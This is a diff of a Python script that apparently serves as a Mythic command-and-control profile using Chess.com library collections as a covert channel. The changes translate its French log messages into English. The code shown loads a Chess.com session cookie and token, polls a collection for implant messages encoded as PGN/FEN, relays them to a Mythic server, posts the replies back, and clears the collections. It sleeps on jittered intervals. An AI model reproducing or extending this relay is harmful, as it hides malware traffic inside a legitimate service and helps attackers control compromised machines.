@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Profil C2 Chess.com pour Mythic — écoute les collections bibliothèque (PGN/FEN),
-décodage compatible CheckmateC2, relais vers Mythic.
+Mythic C2 profile for Chess.com - polls library collections (PGN/FEN),
+decodes Base5/FEN payloads (CheckmateC2 compatible), relays to Mythic.
 """
 
 from __future__ import annotations
@@ -38,10 +38,10 @@ def load_config() -> dict:
             data = json.load(f)
         if "instances" in data and isinstance(data["instances"], list) and data["instances"]:
             data = data["instances"][0]
-        logger.info("Config chargée depuis config.json")
+        logger.info("Config loaded from config.json")
         return data
 
-    logger.warning("config.json absent — variables d'environnement uniquement")
+    logger.warning("config.json not found - falling back to environment variables")
     return {
         "chess_com_cookie": os.environ.get("CHESS_COM_COOKIE", ""),
         "upload_token": os.environ.get("CHESS_UPLOAD_TOKEN", ""),
@@ -85,7 +85,7 @@ def parse_skip_ids(s: str) -> frozenset[str]:
 
 async def poll_loop(client: ChessComClient, interval: int, jitter: int) -> None:
     logger.info(
-        "Boucle poll démarrée (interval=%ss jitter=%s%% mythic=%s)",
+        "Poll loop started (interval=%ss jitter=%s%% mythic=%s)",
         interval,
         jitter,
         MYTHIC_AGENT_URL,
@@ -97,26 +97,23 @@ async def poll_loop(client: ChessComClient, interval: int, jitter: int) -> None:
                 await asyncio.sleep(3.0)
                 continue
 
-            logger.info("Message agent reçu (%s octets bruts)", len(raw))
-            # Vide l'outbound immédiatement : l'agent ne doit pas lire une réponse périmée
+            logger.info("Agent message received (%s raw bytes)", len(raw))
+            # Clear outbound immediately so the agent never reads a stale response
             try:
                 await client.clear_collection(client.outbound_id)
             except Exception as e:
-                logger.warning("clear outbound avant réponse: %s", e)
+                logger.warning("Failed to clear outbound before response: %s", e)
             response = await forward_to_mythic(raw)
-            logger.info("Réponse Mythic (%s octets)", len(response))
+            logger.info("Mythic response (%s bytes)", len(response))
 
             await client.upload_payload(client.outbound_id, response)
             try:
                 await client.clear_collection(client.inbound_id)
             except Exception as e:
-                logger.warning(
-                    "Impossible de vider la collection entrante (doublons possibles): %s",
-                    e,
-                )
+                logger.warning("Failed to clear inbound (possible duplicates): %s", e)
 
         except Exception as e:
-            logger.error("Erreur dans la boucle poll: %s", e, exc_info=True)
+            logger.error("Poll loop error: %s", e, exc_info=True)
 
         await asyncio.sleep(compute_sleep(interval, jitter))
 
@@ -142,7 +139,7 @@ async def main() -> None:
         ("server_to_agent_collection", outbound),
     ]:
         if not val:
-            logger.error("Paramètre requis manquant: %s", name)
+            logger.error("Missing required parameter: %s", name)
             sys.exit(1)
 
     skip = frozenset(DEFAULT_SKIP_IDS | extra_skip)
